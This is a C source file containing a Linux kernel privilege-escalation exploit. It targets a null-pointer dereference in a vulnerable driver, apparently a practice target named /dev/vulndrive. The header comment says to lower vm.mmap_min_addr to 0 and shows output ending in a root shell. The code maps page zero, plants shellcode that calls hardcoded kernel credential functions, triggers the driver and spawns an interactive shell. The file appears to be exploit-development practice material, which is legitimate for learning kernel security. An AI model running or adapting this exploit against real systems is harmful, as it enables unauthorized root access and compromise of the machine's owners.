/* /dev/vuldrive calls a function that points to 0x0. If we map
 * a null page we can trigger a payload to 'privilege escalation'.
 * We must set mmap_min_addr to 0.
 * /sbin/sysctl vm.mmap_min_addr=0
 *
 * $ ./mmap
 * Page 0x0 mmaped:0xbfde0cd8[(nil)]
 * Send the command...
 * [+] enjoy the shell
 * sh-4.3# id
 * uid=0(root) gid=0(root) groups=0(root)
 *
 */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <err.h>

#define DEVICE "/dev/vulndrive"

int main(int argc, char *argv[]){
	char *ptr;
	int fd;
	char payload[] = "\x31\xc0"		/* xor %eax, %eax	*/
			 "\xe8\x19\x53\x07\xc1"	/* call 0xc1075320 	*/
			 "\xe8\xd4\x4f\x07\xc1"	/* call 0xc1074fe0	*/
			 "\xc3";		/* ret			*/

	ptr = mmap(NULL, 4096, 
			PROT_READ | PROT_WRITE | PROT_EXEC, 
			MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, 
			0, 0);

	if(ptr != NULL){
		perror("mmap");
		return 1;
	}

	printf("Page 0x0 mmaped:%p[%p]\n", &ptr, ptr);

	memcpy(0, payload, sizeof(payload));

	/* open for read/write */
	fd = open(DEVICE, O_RDWR);
	if(fd == -1){
		printf("Error!\n");
		exit(1);
	}

	/* send random data is enough */
	printf("Send the command...\n");
	write(fd, payload, sizeof(payload));
	
	if (getuid() == 0){
		printf("[+] enjoy the shell\n");
	}else
		warnx("failed to get root.");

	execl("/bin/sh", "sh", "-i", NULL);
}
